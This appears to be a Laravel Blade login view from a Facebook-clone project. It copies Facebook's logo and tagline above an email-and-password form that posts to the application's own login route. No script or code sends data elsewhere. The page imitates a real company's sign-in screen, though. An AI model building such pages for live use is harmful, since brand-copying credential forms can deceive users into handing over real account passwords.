<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <link rel="stylesheet" type="text/css" href="{{asset('assets/loginstyle.css')}}">
    <title>Login</title>
</head>
<body>

    <div class="box">
        <div class="title-box">
          <img src="https://i.postimg.cc/NMyj90t9/logo.png" alt="Facebook">
          <p>Facebook helps you connect and share with the people in your life.</p>
        </div>
        <div class="form-box">
            <x-jet-authentication-card>
                <x-slot name="logo">

                </x-slot>

                <x-jet-validation-errors class="mb-4" />
                @if (session('status'))
                <div class="mb-4 font-medium text-sm text-green-600">
                    {{ session('status') }}
                </div>
            @endif

          <form method="POST" action="{{ route('login') }}">
            @csrf
            <input type="text" name="email" placeholder="Email address or phone number">
            <input type="password" name="password" placeholder="Password">
            <button type="submit">

                {{ __('Log in') }}

            </button>
            <a href="#">Forgotten Password</a>
          </form>
        </x-jet-authentication-card>
          <hr>
          <div class="create-btn">
            <a href="{{route('register')}}" target="_blank">Create New Account</a>
          </div>
        </div>
      </div>
</body>
</html>

